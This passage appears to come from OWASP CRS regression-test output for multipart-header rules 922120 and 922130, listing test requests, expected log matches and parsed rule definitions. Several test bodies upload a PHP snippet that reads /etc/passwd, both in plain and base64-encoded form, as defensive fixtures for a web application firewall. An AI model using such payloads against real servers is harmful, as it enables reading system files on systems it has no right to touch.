        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test: utf-7 is not in allowed charsets",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-Disposition: form-data; name=\"flavors\"\nContent-Transfer-Encoding: 8bit\nContent-Type: text/plain; charset=utf-7\n\nPineapple. Pizza.\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 922120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Content-Transfer-Encoding was deprecated by rfc7578 in 2015 and should not be used (see: https://www.rfc-editor.org/rfc/rfc7578#section-4.7)"
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "content-transfer-encoding:(.*)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Content-Transfer-Encoding was deprecated by rfc7578 in 2015 and should not be used"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-deprecated-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 1,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the first position.\n--boundary\n\\x0EContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 1",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the first position.\n--boundary\n\\x0EContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCg5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 2,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the last position.\n--boundary\nContent-Disposition\\x0E: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 2",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x0E character at the last position.\n--boundary\nContent-Disposition\\x0E: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb24OOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 3,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Negative test: no special character in multipart header",
    "cause" : "nothing checked for test 3",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Negative test: no special character in multipart header",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\")); ?>\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 4,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x20 character, the last invalid character before the valid range.\n--boundary\nContent-\\x20Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
    "cause" : "nothing checked for test 4",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Positive test: special character in multipart header.\nRequest is a multipart request with 2 Content-Disposition headers,\nwhere the first one contains a 0x20 character, the last invalid character before the valid range.\n--boundary\nContent-\\x20Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\"));\n--boundary--\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "encoded_request" : "UE9TVCAvcG9zdCBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LUxlbmd0aDogMTg2DQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWJvdW5kYXJ5DQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIENSUyB0ZXN0IGFnZW50DQoNCi0tYm91bmRhcnkNCkNvbnRlbnQtIERpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0iMS5waHAiDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InBvc3QiDQoNCjw/cGhwIHZhcl9kdW1wKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsNCi0tYm91bmRhcnktLQ=="
        },
        "output" : {
          "log" : {
            "match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 5,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Negative test: no character from outside of range in multipart header; '!' is allowed (!, the first character in the range of valid characters))",
    "cause" : "nothing checked for test 5",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Negative test: no character from outside of range in multipart header; '!' is allowed (!, the first character in the range of valid characters))",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-!Disposition: form-data; name=\"file\"; filename=\"1.php\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\")); ?>\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922130",
    "test_id" : 6,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922130.yaml",
    "description" : "Negative test: no character from outside of range in multipart header; '~' is allowed (~, the last valid character in the range of valid characters)",
    "cause" : "nothing checked for test 6",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "Negative test: no character from outside of range in multipart header; '~' is allowed (~, the last valid character in the range of valid characters)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent~Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Disposition: form-data; name=\"post\"\n\n<?php var_dump(file_get_contents(\"/etc/passwd\")); ?>\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "no_match_regex" : "Multipart parsing error: Multipart: Invalid part header \\(contains invalid character\\)|\\[id \"922130\"\\].*\\[msg \"Multipart header contains characters outside of valid range\"\\]"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Multipart header names can't contain any characters outside of range 33 and 126,"
        }, {
          "type" : "Comment",
          "text" : " excluding 58 (':') which is the separator."
        }, {
          "type" : "Comment",
          "text" : " RFC 2045 refers RFC 822 about the header syntax."
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[^\\x21-\\x7E][\\x21-\\x39\\x3B-\\x7E]*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart header contains characters outside of valid range"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
